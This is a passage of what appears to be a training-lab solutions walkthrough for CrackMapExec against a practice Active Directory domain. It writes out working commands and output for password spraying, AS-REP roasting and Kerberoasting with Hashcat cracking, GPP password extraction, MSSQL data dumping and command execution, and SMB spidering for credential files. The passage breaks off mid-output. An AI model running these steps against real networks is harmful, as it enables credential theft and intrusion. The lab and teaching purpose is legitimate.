SMB         10.129.204.177  5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        10.129.204.177  5985   DC01             [*] http://10.129.204.177:5985/wsman
WINRM       10.129.204.177  5985   DC01             [-] inlanefreight.htb\carlos:Inlanefreight02!
WINRM       10.129.204.177  5985   DC01             [-] inlanefreight.htb\grace:Inlanefreight01!
WINRM       10.129.204.177  5985   DC01             [+] inlanefreight.htb\nicole:Inlanefreight02! (Pwn3d!)
```

It is revealed that `nicole` has access to `winrm`.

Answer: `nicole`

# Password Spraying

## Question 4

### "Is there any other local MSSQL account created with the same username and password as the corresponding Active Directory account?"

Students need to use the lists containing found usernames and found passwords, targeting `mssql` with `CrackMapExec`:

Code: shell

```shell
crackmapexec mssql STMIP -u usersfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec mssql 10.129.204.177 -u usersfound.txt -p passfound.txt --no-bruteforce --continue-on-success

MSSQL       10.129.204.177  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.204.177  1433   DC01             [+] inlanefreight.htb\carlos:Inlanefreight02! 
MSSQL       10.129.204.177  1433   DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
MSSQL       10.129.204.177  1433   DC01             [+] inlanefreight.htb\nicole:Inlanefreight02!
```

It is revealed that the `mssql` password for `nicole` is the same as her password for SMB, which uses domain credentials for authentication.

Answer: `nicole`

# Finding ASREPRoastable Accounts

## Question 1

### "Which other account is vulnerable to ASREPRoast?"

Students first need to add two entries into their hosts file for the spawned target:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.htb dc01.inlanefreight.htb" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ sudo sh -c 'echo "STMIP inlanefreight.htb dc01.inlanefreight.htb" >> /etc/hosts'
```

To discover ASREPRoastable accounts, students need to target LDAP with an empty password, using the previously created userslist.txt file:

Code: shell

```shell
crackmapexec ldap dc01.inlanefreight.htb -u userslist.txt -p '' --asreproast asreproast.out
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap dc01.inlanefreight.htb -u userslist.txt -p '' --asreproast asreproast.out

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        inlanefreight.htb 445    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:9f88ae427a2d7c3439617b30dab31f94$f79af0314c9d0aea010a9ccfbad3cafcbad3f4ac1dee3b4efb99883e0a57222bba5a4c3fb9dc8c17fe084e4d53198cdd52665be15927d0869d3be0a3e3ea07a711ba59d90897f9fb9bef418cfb905b60113d9b2e8d7353d20d8881645be391cce846838530e04dbd41b056f6a9eb0a6eb31995404935a0b28e32c22cde68c97d12da6a7045d6ca936389ca3ff9e8e76ce3aeaaa458f192bac72a2b843e168e0e1c07140552d795c37bf69e848afb41fd86d2fcc4e6053cbd10832f12c6f1e509c471f948b5a4cc5b341164542e61f56425d1a892de69ed53c797e497f7b4fba08914b6e7d420e5401e8bd8b2fc5d5f70952b62469b55
LDAP        inlanefreight.htb 445    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:d5cb303e59043b0ee5a8f84e65f31738$0a552ce6af521d63e4321c9152593faf6d2c2a241adf65662c501efe622e43938550b1099799d9887abff991a7ccb4eeff472f7e8438103d0a257110255c18b66397cd4698401a368df7fe795b6e4eb02d646c21586e6a9534c814fbba936a53a1d1eace0967f566f4be9bb2b3acb438af0669320d8d68aaf1803ae713bee7326966a59b0a9c002be678520762f65b89cf1b4915a09e661cc622fb2c45dc95dc7a55555b5d076508f6affa049b0c1d8ee78d7b9ae4d0d1d726a961c36e0b841ee843b5b27544c2809f61a5a1bbc00addc849729e3956c872f1abb15984afd1165e8bb633c9c80ef50b8e9f824373397849566a96c550
```

The other roastable user is shown to be `linda`.

Answer: `linda`

# Finding ASREPRoastable Accounts

## Question 2

### "What's the password of the account you found?"

Students need to use `Hashcat` to crack the password:

Code: shell

```shell
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt --force
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.124]─[htb-ac594497@htb-sf54d23omb]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$linda@INLANEFREIGHT.HTB:d5cb303e59043b0ee5a8f84e65f31738$0a552ce6af521d63e4321c9152593faf6d2c2a241adf65662c501efe622e43938550b1099799d9887abff991a7ccb4eeff472f7e8438103d0a257110255c18b66397cd4698401a368df7fe795b6e4eb02d646c21586e6a9534c814fbba936a53a1d1eace0967f566f4be9bb2b3acb438af0669320d8d68aaf1803ae713bee7326966a59b0a9c002be678520762f65b89cf1b4915a09e661cc622fb2c45dc95dc7a55555b5d076508f6affa049b0c1d8ee78d7b9ae4d0d1d726a961c36e0b841ee843b5b27544c2809f61a5a1bbc00addc849729e3956c872f1abb15984afd1165e8bb633c9c80ef50b8e9f824373397849566a96c550:Password123
$krb5asrep$23$noemi@INLANEFREIGHT.HTB:9f88ae427a2d7c3439617b30dab31f94$f79af0314c9d0aea010a9ccfbad3cafcbad3f4ac1dee3b4efb99883e0a57222bba5a4c3fb9dc8c17fe084e4d53198cdd52665be15927d0869d3be0a3e3ea07a711ba59d90897f9fb9bef418cfb905b60113d9b2e8d7353d20d8881645be391cce846838530e04dbd41b056f6a9eb0a6eb31995404935a0b28e32c22cde68c97d12da6a7045d6ca936389ca3ff9e8e76ce3aeaaa458f192bac72a2b843e168e0e1c07140552d795c37bf69e848afb41fd86d2fcc4e6053cbd10832f12c6f1e509c471f948b5a4cc5b341164542e61f56425d1a892de69ed53c797e497f7b4fba08914b6e7d420e5401e8bd8b2fc5d5f70952b62469b55:Password!
                                                 
Session..........: hashcat
Status...........: Cracked
```

The password is revealed to be `Password123`.

Answer: `Password123`

# Searching for Accounts in Group Policy Objects

## Question 1

### "What's the name of the other account present in the GPO?"

Students need to target SMB, authenticating as `grace:Inlanefreight01!` and utilizing the `gpp_password` module:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! -M gpp_password
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)

<SNIP>

GPP_PASS... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             Password: HackingGPPlike4Pro
GPP_PASS... 10.129.204.177  445    DC01             action: U
GPP_PASS... 10.129.204.177  445    DC01             newName: 
GPP_PASS... 10.129.204.177  445    DC01             fullName: 
GPP_PASS... 10.129.204.177  445    DC01             description: 
GPP_PASS... 10.129.204.177  445    DC01             changeLogon: 0
GPP_PASS... 10.129.204.177  445    DC01             noChange: 1
GPP_PASS... 10.129.204.177  445    DC01             neverExpires: 1
GPP_PASS... 10.129.204.177  445    DC01             acctDisabled: 0
GPP_PASS... 10.129.204.177  445    DC01             userName: inlanefreight.htb\diana
```

The module reveals the other account is `diana`.

Answer: `diana`

# Searching for Accounts in Group Policy Objects

## Question 2

### "What's the password of that account?"

Students need to target SMB, authenticating as `grace:Inlanefreight01!` and utilizing the `gpp_password` module:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! -M gpp_password
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)

<SNIP>

GPP_PASS... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             Password: HackingGPPlike4Pro
GPP_PASS... 10.129.204.177  445    DC01             action: U
GPP_PASS... 10.129.204.177  445    DC01             newName: 
GPP_PASS... 10.129.204.177  445    DC01             fullName: 
GPP_PASS... 10.129.204.177  445    DC01             description: 
GPP_PASS... 10.129.204.177  445    DC01             changeLogon: 0
GPP_PASS... 10.129.204.177  445    DC01             noChange: 1
GPP_PASS... 10.129.204.177  445    DC01             neverExpires: 1
GPP_PASS... 10.129.204.177  445    DC01             acctDisabled: 0
GPP_PASS... 10.129.204.177  445    DC01             userName: inlanefreight.htb\diana
```

The password is shown to be `HackingGPPlike4Pro`.

Answer: `HackingGPPlike4Pro`

# Searching for Accounts in Group Policy Objects

## Question 3

### "Does the account have access to connect to WinRM? (True or False)"

Students need to use the previously discovered credentials for `diana` to test if the account has `WinRM` access:

Code: shell

```shell
crackmapexec winrm STMIP -u diana -p HackingGPPlike4Pro
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec winrm 10.129.204.177 -u diana -p HackingGPPlike4Pro

SMB         10.129.204.177  5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        10.129.204.177  5985   DC01             [*] http://10.129.204.177:5985/wsman
WINRM       10.129.204.177  5985   DC01             [+] inlanefreight.htb\diana:HackingGPPlike4Pro (Pwn3d!)
```

The output shows `Pwn3d!`, indicating that the password is valid, and `diana` does indeed have access to `WinRM`.

Answer: `True`

# Working with Modules

## Question 1

### "What is the secret word displayed in the default search of user descriptions?"

Students need target `ldap`, authenticating as `grace:Inlanefreight01!` while using the `user-desc` module:

Code: shell

```shell
crackmapexec ldap STMIP -u grace -p Inlanefreight01! -M user-desc
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
USER-DES...                                         User: krbtgt - Description: Key Distribution Center Service Account
USER-DES...                                         User: alina - Description: Account for testing HR App. Password: HRApp123!
USER-DES...                                         User: diana - Description: Secret word WeLoveHacking
USER-DES...                                         Saved 8 user descriptions to /home/htb-ac594497/.cme/logs/UserDesc-10.129.204.177-20230105_164732.log
```

The secret word is shown to be `WeLoveHacking`.

Answer: `WeLoveHacking`

# Working with Modules

## Question 2

### "Use the module user-desc with the keyword IP. What's the IP address you found?"

Students need target `ldap`, authenticating as `grace:Inlanefreight01!` while using the `user-desc` module. Getting a bit more granular, students need to set the `KEYWORD` option to IP:

Code: shell

```shell
crackmapexec ldap STMIP -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
USER-DES...                                         User: john - Description: User for kiosko IP 172.16.10.9
USER-DES...                                         Saved 8 user descriptions to /home/htb-ac594497/.cme/logs/UserDesc-10.129.204.177-20230105_165100.log
```

The IP address that is parsed from the user description is shown to be `172.16.10.9`.

Answer: `172.16.10.9`

# MSSQL Enumeration and Attacks

## Question 1

### "Test the accounts that we previously identified their credentials. Which other account has permission to do privilege escalation?"

Students need to continue to use the list of discovered users and passwords, testing one by one with the `mssql_priv` module until the right user can be identified:

Code: shell

```shell
crackmapexec mssql STMIP -u engels -p Inlanefreight1998! -M mssql_priv
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]

└──╼ [★]$ crackmapexec mssql 10.129.208.137 -u engels -p Inlanefreight1998! -M mssql_priv

MSSQL       10.129.208.137  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL       10.129.208.137  1433   DC01             [+] inlanefreight.htb\engels:Inlanefreight1998! 
MSSQL_PR... 10.129.208.137  1433   DC01             [+] INLANEFREIGHT\engels can impersonate julio (sysadmin)
```

Eventually, after testing multiple accounts, students will see the `engels` user can impersonate `julio` and escalate privileges.

Answer: `engels`

# MSSQL Enumeration and Attacks

## Question 2

### "What's the flag located in the database core\_app? (Omit b'' in the response)"

Using any account with authentication enabled to the database, students need to dump all tables from the `core_app` database:

Code: shell

```shell
crackmapexec mssql STMIP -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec mssql 10.129.208.137 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"

MSSQL       10.129.208.137  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.208.137  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.208.137  1433   DC01             table_name
MSSQL       10.129.208.137  1433   DC01             --------------------------------------------------------------------------------------------------------------------------------
MSSQL       10.129.208.137  1433   DC01             tbl_users
MSSQL       10.129.208.137  1433   DC01             tbl_flag
```

Then, students need to dump the content of the `tbl_flag` table:

Code: shell

```shell
crackmapexec mssql STMIP -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from core_app.dbo.tbl_flag"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec mssql 10.129.208.137 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from core_app.dbo.tbl_flag"

MSSQL       10.129.208.137  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.208.137  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.208.137  1433   DC01             flag
MSSQL       10.129.208.137  1433   DC01             --------------------------------------------------
MSSQL       10.129.208.137  1433   DC01             b'Looking@Dat4'
```

Once the table has been dumped, the flag is shown to be `Looking@Dat4`.

Answer: `Looking@Dat4`

# MSSQL Enumeration and Attacks

## Question 3

### "What's the content of the file located at "C:\\SQL2019\\sql\_flag.txt"?"

Students need to use `CrackMapExec`'s code execution capabilities to read the flag:

Code: shell

```shell
crackmapexec mssql STMIP -u nicole -p Inlanefreight02! --local-auth -x "more C:\SQL2019\sql_flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.113]─[htb-ac594497@htb-nsbvschljf]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec mssql 10.129.208.137 -u nicole -p Inlanefreight02! --local-auth -x "more C:\SQL2019\sql_flag.txt"

MSSQL       10.129.208.137  1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
MSSQL       10.129.208.137  1433   DC01             [+] nicole:Inlanefreight02! (Pwn3d!)
MSSQL       10.129.208.137  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.208.137  1433   DC01             --------------------------------------------------------------------------------
MSSQL       10.129.208.137  1433   DC01             F1l3$_UsinG_MS$QL
```

The flag reads `F1l3$_UsinG_MS$QL`.

Answer: `F1l3$_UsinG_MS$QL`

# Finding Kerberoastable Accounts

## Question 1

### "Which account, excluding grace, peter, and service accounts, is vulnerable to Kerberoasting?"

Students need to make sure they have the appropriate entries added to their hosts file for inlanefreight.htb and dc01.inlanefreight.htb:

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ sudo cat /etc/hosts

<SNIP>

127.0.1.1 htb-rk5ahe0mig.htb-cloud.com htb-rk5ahe0mig
127.0.0.1 localhost

10.129.204.177 inlanefreight.htb dc01.inlanefreight.htb

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
```

Next, students need to perform a Kerberoasting attack:

Code: shell

```shell
crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        inlanefreight.htb 389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
LDAP        inlanefreight.htb 389    DC01             [*] Total of records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...

<SNIP>

LDAP        inlanefreight.htb 389    DC01             sAMAccountName: elieser memberOf:  pwdLastSet: 2022-12-01 11:17:28.883440 lastLogon:<never>
LDAP        inlanefreight.htb 389    DC01             $krb5tgs$23$*elieser$INLANEFREIGHT.HTB$inlanefreight.htb/elieser*$08b6a49431bde9b3785270611bc2f8e0$3e68aa31a6e0cee9ed367564a5295d57e94f24ac6498bbd4c7141d26b608916d1c2e2fd14163ec362291ee3d5a66ff046c279ef5c6d4e6f38f49b9d80be21bdff5d7af9d6b17955e90a53bd67785ca6a09f969e51d38b504482babc81e79c02d3566d1e01bfd86fc46eeb3edab33484b4ce5f38f894cb92f56bef119d653c3045afed8432664cc2573115170c26b2b211e4a0dc420a516240b8293662b1e36832d0e9fb57fa1abf4971c6b939e0cf8ed4973df52411bd2deab704f8c776221627914e79552b96076a85b5cd54c6b88de08b75504e66f44db88e3678d4472c78bcc7089bc06319e031ffec4c1073c59138c578f6f0362658708eec0739d807435376e7cd8f27e82e6ae85a8c4692dec1dcb71e1f5f672ae7b7dae731ed5012280786ca06749755561e2d50c6ab82fd0a27d8f4b71658157a085bdc7070af5c66bf0b9918d3399ba364639ab1c146e7aad40f89497b8688143f2693134a3a0adeb290fce38ebf209386c9e45ead07d3c8727fe3736a0be0f22f6e01d54576a0539eb3439b91b8a9187117c69724fad845858a199791f249de0e7907c0a12986e2b6cba6cc083d610041561ae72bc5c9e837cfcf38c60a5d92ca5985d9df1f94936451a7b8b6d87de87532753b5e1908c38d620986d85b75c90e2c82ddd5643afbd9f4e7293278b452ea712525acd1ca0ede63ed7d431a3ad78ae2bf4d9578a8c435380dda3efb5d4c42f6db22fbedd7ddd9571335e3c75e078ead0a5c0c56de8016c13c096a48660364d2e430fde9a1c3a62be77e79e582637febe72c35443897e8b37d109e415927ee9475ab6f773f9d56fe53a7abce4566be032cd81872a4f8e3bb0cc3c86c86db57e47953bb75d0fb2fe49212513b98c31c9332908f8c3657233cc7c861aac6c08ce8e989e2bf74bacc6e7c8364da3864d178910729c280490d9d95dc73cc1b0e3f5e15c79bdbfe1a8a4f70723aa090ef0188d7eacd9261d35f0222cc62363fc884352eb452e3f03587795af9eaa2a5c849f4221957b864f02c022ac41ebf9df2f6c9c093d2d0199185726c02f0a23f6191d3a4909ac643ecdec598c4bd8bf5933e3de6ac64c655ba086109ebd1610d0d143e97c96567d18409da8dbb4cd166334dff8167c7d2a05c4c013be2980fdd43dd34ff586f7400c9fdc394c289a7d28dc418e411f9ad2baecedd671015a503293bf28846c80bb6cd76c112a010de56255994efc2cd681e4c50b98e2264c41bd815901b6aa34bb1368832d69ba37d16548dcd6b149f2e484b4b971835bd6546e84c205e579a8874e5d7b407e9cb13a726add1c8519ef06dc0b268c4c0c74fd8e5ce8c6c986c89e2b8b46a5c333e411789686f5680e5c4bccc2ca6afa24a2e63b18a288dbd56060ae37ae71497d1dcab874a9c3a6828259f049d84ff6c66ca23c15238d42150c0e9de5b9fda969c116d10650e7c1d96a0a04dc8be462af5e8845
```

The other vulnerable account is shown to be `elieser`.

Answer: `elieser`

# Finding Kerberoastable Accounts

## Question 2

### "What's the password for that account?"

Students need to run `Hashcat` against the output from the Kerberoasting attack:

Code: shell

```shell
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*elieser$INLANEFREIGHT.HTB$inlanefreight.htb/elieser*$08b6a49431bde9b3785270611bc2f8e0$3e68aa31a6e0cee9ed367564a5295d57e94f24ac6498bbd4c7141d26b608916d1c2e2fd14163ec362291ee3d5a66ff046c279ef5c6d4e6f38f49b9d80be21bdff5d7af9d6b17955e90a53bd67785ca6a09f969e51d38b504482babc81e79c02d3566d1e01bfd86fc46eeb3edab33484b4ce5f38f894cb92f56bef119d653c3045afed8432664cc2573115170c26b2b211e4a0dc420a516240b8293662b1e36832d0e9fb57fa1abf4971c6b939e0cf8ed4973df52411bd2deab704f8c776221627914e79552b96076a85b5cd54c6b88de08b75504e66f44db88e3678d4472c78bcc7089bc06319e031ffec4c1073c59138c578f6f0362658708eec0739d807435376e7cd8f27e82e6ae85a8c4692dec1dcb71e1f5f672ae7b7dae731ed5012280786ca06749755561e2d50c6ab82fd0a27d8f4b71658157a085bdc7070af5c66bf0b9918d3399ba364639ab1c146e7aad40f89497b8688143f2693134a3a0adeb290fce38ebf209386c9e45ead07d3c8727fe3736a0be0f22f6e01d54576a0539eb3439b91b8a9187117c69724fad845858a199791f249de0e7907c0a12986e2b6cba6cc083d610041561ae72bc5c9e837cfcf38c60a5d92ca5985d9df1f94936451a7b8b6d87de87532753b5e1908c38d620986d85b75c90e2c82ddd5643afbd9f4e7293278b452ea712525acd1ca0ede63ed7d431a3ad78ae2bf4d9578a8c435380dda3efb5d4c42f6db22fbedd7ddd9571335e3c75e078ead0a5c0c56de8016c13c096a48660364d2e430fde9a1c3a62be77e79e582637febe72c35443897e8b37d109e415927ee9475ab6f773f9d56fe53a7abce4566be032cd81872a4f8e3bb0cc3c86c86db57e47953bb75d0fb2fe49212513b98c31c9332908f8c3657233cc7c861aac6c08ce8e989e2bf74bacc6e7c8364da3864d178910729c280490d9d95dc73cc1b0e3f5e15c79bdbfe1a8a4f70723aa090ef0188d7eacd9261d35f0222cc62363fc884352eb452e3f03587795af9eaa2a5c849f4221957b864f02c022ac41ebf9df2f6c9c093d2d0199185726c02f0a23f6191d3a4909ac643ecdec598c4bd8bf5933e3de6ac64c655ba086109ebd1610d0d143e97c96567d18409da8dbb4cd166334dff8167c7d2a05c4c013be2980fdd43dd34ff586f7400c9fdc394c289a7d28dc418e411f9ad2baecedd671015a503293bf28846c80bb6cd76c112a010de56255994efc2cd681e4c50b98e2264c41bd815901b6aa34bb1368832d69ba37d16548dcd6b149f2e484b4b971835bd6546e84c205e579a8874e5d7b407e9cb13a726add1c8519ef06dc0b268c4c0c74fd8e5ce8c6c986c89e2b8b46a5c333e411789686f5680e5c4bccc2ca6afa24a2e63b18a288dbd56060ae37ae71497d1dcab874a9c3a6828259f049d84ff6c66ca23c15238d42150c0e9de5b9fda969c116d10650e7c1d96a0a04dc8be462af5e8845:Passw0rd
```

After cracking the hash, students will find the cleartext password for the user is `Passw0rd`.

Answer: `Passw0rd`

# Finding Kerberoastable Accounts

## Question 3

### "Which shared folder does this account have READ and WRITE access to?"

Students need to target smb, authenticating as `elieser:Passw0rd` while also enumerating available shares:

Code: shell

```shell
crackmapexec smb dc01.inlanefreight.htb -u elieser -p Passw0rd --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb dc01.inlanefreight.htb -u elieser -p Passw0rd --shares

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         inlanefreight.htb 445    DC01             [+] inlanefreight.htb\elieser:Passw0rd 
SMB         inlanefreight.htb 445    DC01             [+] Enumerated shares
SMB         inlanefreight.htb 445    DC01             Share           Permissions     

<SNIP>

SMB         inlanefreight.htb 445    DC01             linux01         READ,WRITE      
```

The share with read and write access to shown to be `linux01`.

Answer: `linux01`

# Spidering and Finding Juicy Information from an SMB Share

## Question 1

### "Which other file, not shown in the example, it's available in the IT share?"

Students need to target smb, authenticating as `grace:Inlanefreight01!`, spidering the IT share and utilizing CME's pattern option to look for files with a .txt extension:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! --spider IT --pattern txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.15.169 -u grace -p Inlanefreight01! --spider IT --pattern txt

SMB         10.129.15.169   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.169   445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.15.169   445    DC01             [*] Started spidering
SMB         10.129.15.169   445    DC01             [*] Spidering .
SMB         10.129.15.169   445    DC01             //10.129.15.169/IT/Creds.txt [lastm:'2022-12-01 13:01' size:54]
SMB         10.129.15.169   445    DC01             //10.129.15.169/IT/IPlist.txt [lastm:'2022-12-01 13:01' size:36]
SMB         10.129.15.169   445    DC01             //10.129.15.169/IT/Documents/PCNames.txt [lastm:'2022-12-01 13:01' size:22]
SMB         10.129.15.169   445    DC01             [*] Done spidering (Completed in 1.1556875705718994)
```

The other text file on the share is shown to be `PCNames.txt`.

Answer: `PCNames.txt`

# Spidering and Finding Juicy Information from an SMB Share

## Question 2

### "Use grace credentials to spider in the shared folder Users with the pattern txt. What's the name of the file you found?"

Students need to authenticate as `grace:Inlanefreight01!`, spidering the Users share while utilizing the pattern option to look for files with a .txt extension:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! --spider Users --pattern txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.15.169 -u grace -p Inlanefreight01! --spider Users --pattern txt

SMB         10.129.15.169   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.169   445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.15.169   445    DC01             [*] Started spidering
SMB         10.129.15.169   445    DC01             [*] Spidering .
SMB         10.129.15.169   445    DC01             //10.129.15.169/Users/creds.txt [lastm:'2022-12-01 13:05' size:9]
SMB         10.129.15.169   445    DC01             [*] Done spidering (Completed in 0.9848158359527588)
```

The spidering of the Users share reveals the `creds.txt` file.

Answer: `creds.txt`

# Spidering and Finding Juicy Information from an SMB Share

## Question 3

### "Use the spider\_plus module to search all shares. In which shared folder did you find the file powershelltest.ps1?"

Students need to target smb, authenticating as `grace:Inlanefreight01!`, utilizing the spider\_plus module and setting the options to exclude certain shares:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.15.169 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

SMB         10.129.15.169   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.169   445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SPIDER_P... 10.129.15.169   445    DC01             [*] Started spidering plus with option:
SPIDER_P... 10.129.15.169   445    DC01             [*]        DIR: ['ipc$', 'print$', 'netlogon', 'sysvol']
